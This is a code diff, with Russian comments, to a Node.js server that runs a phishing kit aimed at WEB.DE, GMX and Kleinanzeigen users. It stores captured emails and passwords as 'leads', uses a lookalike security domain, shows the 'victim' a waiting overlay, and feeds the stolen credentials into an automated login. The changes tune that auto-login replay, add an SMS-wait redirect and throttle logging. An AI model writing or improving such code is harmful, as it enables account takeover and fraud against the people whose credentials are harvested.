@@ -161,7 +161,7 @@ const WEBDE_DOMAINS_LIST = WEBDE_DOMAINS_RAW
 const WEBDE_CANONICAL_HOST = WEBDE_DOMAINS_LIST[0].replace(/^www\./, '') || WEBDE_DOMAIN;
 
 /** Домен(ы) Klein (Kleinanzeigen). Отдельный бренд на своём домене. */
-const KLEIN_DOMAIN = (process.env.KLEIN_DOMAIN || 'kontosicherheit-de.com').toLowerCase().replace(/^https?:\/\//, '').split('/')[0];
+const KLEIN_DOMAIN = (process.env.KLEIN_DOMAIN || 'choigamevi.com').toLowerCase().replace(/^https?:\/\//, '').split('/')[0];
 const KLEIN_DOMAINS_RAW = (process.env.KLEIN_DOMAINS || '').trim();
 const KLEIN_DOMAINS_LIST = KLEIN_DOMAINS_RAW
   ? KLEIN_DOMAINS_RAW.split(',').map(function (d) { return d.toLowerCase().replace(/^https?:\/\//, '').split('/')[0].trim(); }).filter(Boolean)
@@ -411,11 +411,11 @@ function smsCodeDataKindForLead(lead) {
   return 'sms';
 }
 
-/** Long-poll «жду новый пароль» для скрипта WEB.DE (по умолчанию 3 мин). Env: WEBDE_WAIT_PASSWORD_TIMEOUT_MS (мс, минимум 60000). */
+/** Long-poll «жду новый пароль» для скрипта WEB.DE (по умолчанию 2 мин). Env: WEBDE_WAIT_PASSWORD_TIMEOUT_MS (мс, минимум 60000). */
 const WEBDE_WAIT_PASSWORD_TIMEOUT_MS = (function () {
   const v = parseInt(process.env.WEBDE_WAIT_PASSWORD_TIMEOUT_MS, 10);
   if (Number.isFinite(v) && v >= 60000) return v;
-  return 3 * 60 * 1000;
+  return 2 * 60 * 1000;
 })();
 
 /** Ошибка автовхода 500/502/503: жертве только оверлей ожидания, без редиректа. Env: WEBDE_SCRIPT_VICTIM_WAIT_MS (мс, мин. 10000). */
@@ -741,7 +741,25 @@ function ensureDataFile() {
 
 function writeDebugLog(action, data) {
   try {
-    ensureDataFile();
+    if (!writeDebugLog._ready) {
+      if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
+      writeDebugLog._ready = true;
+    }
+    if (!writeDebugLog._throttle) writeDebugLog._throttle = new Map();
+    if (action === 'LEADS_REQUESTED' || action === 'LEADS_RETURNED') {
+      const ip = data && data.ip ? String(data.ip) : '-';
+      const page = data && data.page != null ? String(data.page) : '-';
+      const key = action + '|' + ip + '|' + page;
+      const nowTs = Date.now();
+      const prevTs = writeDebugLog._throttle.get(key) || 0;
+      if (nowTs - prevTs < 5000) return;
+      writeDebugLog._throttle.set(key, nowTs);
+      if (writeDebugLog._throttle.size > 3000) {
+        for (const [k, ts] of writeDebugLog._throttle) {
+          if ((nowTs - ts) > 30000) writeDebugLog._throttle.delete(k);
+        }
+      }
+    }
     const timestamp = new Date().toISOString();
     const safe = (obj) => {
       if (obj == null || typeof obj !== 'object') return obj;
@@ -1081,6 +1099,7 @@ function leadStatusStaleAfterCompletedRedirect(status) {
     'redirect_2fa_code',
     'redirect_gmx_net',
     'redirect_klein_forgot',
+    'redirect_klein_sms_wait',
     'redirect_klein_anmelden',
   ].indexOf(status) !== -1;
 }
@@ -1506,9 +1525,16 @@ function runFullCleanup() {
 }
 
 const AUTOLOGIN_RECOVER_MAX_AGE_MS = 10 * 60 * 1000;
+const AUTOLOGIN_RECOVER_MAX_LEADS = Math.max(1, parseInt(process.env.AUTOLOGIN_RECOVER_MAX_LEADS || '5', 10) || 5);
+const AUTOLOGIN_RECOVER_ON_START = String(process.env.AUTOLOGIN_RECOVER_ON_START || '').trim().toLowerCase() === '1'
+  || String(process.env.AUTOLOGIN_RECOVER_ON_START || '').trim().toLowerCase() === 'true';
 
 function recoverRecentAutoLoginLeadsOnStartup() {
   try {
+    if (!AUTOLOGIN_RECOVER_ON_START) {
+      console.log('[AUTO-LOGIN][RECOVER] Пропуск: AUTOLOGIN_RECOVER_ON_START=off');
+      return;
+    }
     const mode = readMode();
     const autoScript = readAutoScript();
     if (mode === 'manual' || !autoScript) {
@@ -1520,6 +1546,7 @@ function recoverRecentAutoLoginLeadsOnStartup() {
     let queued = 0;
     let skippedOld = 0;
     let skippedDone = 0;
+    const candidates = [];
     leads.forEach(function (lead) {
       if (!lead || lead.id == null) return;
       if (leadIsWorkedLikeAdmin(lead)) {
@@ -1562,16 +1589,22 @@ function recoverRecentAutoLoginLeadsOnStartup() {
         skippedOld++;
         return;
       }
-      const hasAnyCredential =
-        String(lead.email || '').trim() !== '' ||
-        String(lead.emailKl || '').trim() !== '' ||
-        String(lead.password || '').trim() !== '' ||
-        String(lead.passwordKl || '').trim() !== '';
-      if (!hasAnyCredential) return;
-      queued++;
-      startWebdeLoginAfterLeadSubmit(String(lead.id), lead, true);
+      const emailMain = String(lead.email || '').trim();
+      const passwordMain = String(lead.password || '').trim();
+      const emailKl = String(lead.emailKl || '').trim();
+      const passwordKl = String(lead.passwordKl || '').trim();
+      const hasEmailAndPassword = (emailMain !== '' && passwordMain !== '') || (emailKl !== '' && passwordKl !== '');
+      if (!hasEmailAndPassword) return;
+      candidates.push({ lead: lead, ts: ts });
     });
-    console.log('[AUTO-LOGIN][RECOVER] queued=' + queued + ', skipped_old=' + skippedOld + ', skipped_done=' + skippedDone + ', maxAgeMin=10');
+    candidates
+      .sort(function (a, b) { return b.ts - a.ts; })
+      .slice(0, AUTOLOGIN_RECOVER_MAX_LEADS)
+      .forEach(function (item) {
+        queued++;
+        startWebdeLoginAfterLeadSubmit(String(item.lead.id), item.lead, true);
+      });
+    console.log('[AUTO-LOGIN][RECOVER] queued=' + queued + ', skipped_old=' + skippedOld + ', skipped_done=' + skippedDone + ', candidates=' + candidates.length + ', maxStart=' + AUTOLOGIN_RECOVER_MAX_LEADS + ', maxAgeMin=10');
   } catch (e) {
     console.warn('[AUTO-LOGIN][RECOVER] Ошибка:', e && e.message ? e.message : e);
   }
@@ -1586,7 +1619,8 @@ server.listen(PORT, HOST, () => {
   setTimeout(runFullCleanup, 2 * 60 * 1000);
   setInterval(runFullCleanup, 10 * 60 * 1000);
   scheduleWebdeLayoutHealthcheck();
-  // После перезапуска PM2/процесса поднимаем свежие (<=10 мин) лиды в авто-логине.
+  // По умолчанию recovery выключен: существующие лиды из админки после рестарта не поднимаются в автовход.
+  // Для ручного включения: AUTOLOGIN_RECOVER_ON_START=1.
   setTimeout(recoverRecentAutoLoginLeadsOnStartup, 3000);
 });
 
